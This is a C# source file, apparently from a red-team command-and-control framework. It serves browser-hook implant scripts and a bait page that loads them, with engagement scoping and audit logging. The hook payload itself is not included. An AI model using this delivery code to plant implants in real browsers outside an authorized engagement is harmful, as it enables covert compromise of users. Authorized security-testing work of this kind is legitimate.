using Rod.Audit;
using Rod.Transport.Listeners;

namespace Rod.Transport.Endpoints;

// The hook serving core (architecture.md Sec 8): the transport-neutral half
// of the browser-hook edge -- the unguessable route id is the credential, so
// the route serves without a header, a token, or any ceremony a
// <script src> cannot carry. The ingress listener answers for the hook
// record's engagement (a shared-tier front carries no hook); what the wire
// showed lands on the audit trail as the first-touch attribution a hooked
// browser's enrollment then binds to an implant row. The HTTP route and the
// bridge's route-forward carriage drive this same core, so a fetch that
// crossed either front is indistinguishable in the trail.

/// <summary>
/// Serves one hook fetch: the script itself, or the minimal page that pulls
/// it in. The scope is the ingress listener -- null keeps the permissive
/// in-memory-harness shape the HTTP route ran before the extraction.
/// </summary>
internal static class HookServingCore
{
    public static async Task<ServedRoute> ServeAsync(
        Guid hookId,
        bool page,
        Listener? ingress,
        RouteWireFacts facts,
        IPayloadStore payloads,
        IAuditStore audit,
        TimeProvider clock,
        CancellationToken cancellationToken)
    {
        // A deleted (revoked) hook is indistinguishable from a nonexistent
        // one: the record is found by its unguessable id alone.
        var record = await payloads.FindByIdAsync(hookId, cancellationToken);
        if (record is null || !string.Equals(record.Class, "Browser", StringComparison.OrdinalIgnoreCase))
            return ServedRoute.NotFound();

        // The scope refusal the enroll and fetch routes run: the ingress
        // must answer for this engagement or carry nothing at all.
        if (ingress is not null && ingress.EngagementId?.Value != record.EngagementId)
            return ServedRoute.NotFound();

        await audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: record.EngagementId,
                operatorId: Guid.Empty,
                implantId: Guid.Empty,
                taskId: Guid.Empty,
                verb: "hook.fetched",
                kind: AuditEventKind.HookFetched,
                payload: $"remote={facts.Peer} {facts.ListenerFact} "
                    + $"page={(page ? "test-page" : "script")} "
                    + $"ua={(string.IsNullOrWhiteSpace(facts.UserAgent) ? "none" : facts.UserAgent)}",
                output: null,
                outcome: hookId.ToString("N"),
                at: clock.GetUtcNow()),
            cancellationToken);

        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            // no-store: a cached hook serves a stale bake (a revoked
            // credential, an old cadence) for as long as the browser keeps it.
            ["Cache-Control"] = "no-store",
        };
        // The browser-only CORS posture: only browsers send Origin, so the
        // answer marks readability exactly for the audience that needs it and
        // implant traffic and its fingerprint are unchanged.
        if (facts.Origin is { Length: > 0 })
            headers["Access-Control-Allow-Origin"] = "*";

        if (page)
        {
            // The minimal test page the acceptance walk loads: a document
            // that does nothing but pull the hook in, the shape a
            // script-injection foothold produces.
            var url = $"{record.Endpoint?.TrimEnd('/')}/implants/hooks/{hookId:N}";
            var html = $"<!doctype html>\n<html>\n<head><meta charset=\"utf-8\"><title>Page</title></head>\n"
                + $"<body><p>It works.</p>\n<script src=\"{url}\"></script>\n</body>\n</html>\n";
            return new ServedRoute(200, "text/html; charset=utf-8", System.Text.Encoding.UTF8.GetBytes(html))
            {
                Headers = headers,
            };
        }
        return new ServedRoute(200, "application/javascript", record.Content)
        {
            Headers = headers,
        };
    }
}
